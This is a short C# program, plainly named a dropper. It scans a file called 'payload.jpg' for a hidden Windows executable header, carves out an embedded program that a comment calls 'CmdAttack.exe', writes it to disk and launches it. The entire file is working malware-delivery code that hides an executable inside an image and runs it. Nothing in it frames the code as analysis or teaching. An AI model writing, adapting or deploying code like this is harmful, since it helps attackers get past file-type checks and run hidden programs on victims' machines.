using System;
using System.Diagnostics;
using System.IO;

class Dropper
{
    static void Main()
    {
        const string payloadPath = "payload.jpg";
        const string outputExe = "extracted.exe";
        const int originalExeSize = 147456;  // exact size of your CmdAttack.exe

        byte[] data = File.ReadAllBytes(payloadPath);

        // We need at least 4 bytes to check MZ 0x90 0x00
        for (int i = 0; i <= data.Length - 4; i++)
        {
            // Look for the real PE header: 'M' 'Z' 0x90 0x00
            if (data[i] == (byte)'M' &&
                data[i + 1] == (byte)'Z' &&
                data[i + 2] == 0x90 &&
                data[i + 3] == 0x00)
            {
                Console.WriteLine($"Found real PE header at offset {i}, extracting {originalExeSize} bytes...");

                // Copy exactly the EXE bytes
                byte[] exeData = new byte[originalExeSize];
                Array.Copy(data, i, exeData, 0, originalExeSize);

                // Write and execute
                File.WriteAllBytes(outputExe, exeData);
                Process.Start(new ProcessStartInfo
                {
                    FileName = outputExe,
                    UseShellExecute = true
                });
                return;
            }
        }

        Console.WriteLine("No valid EXE header found in payload.");
    }
}
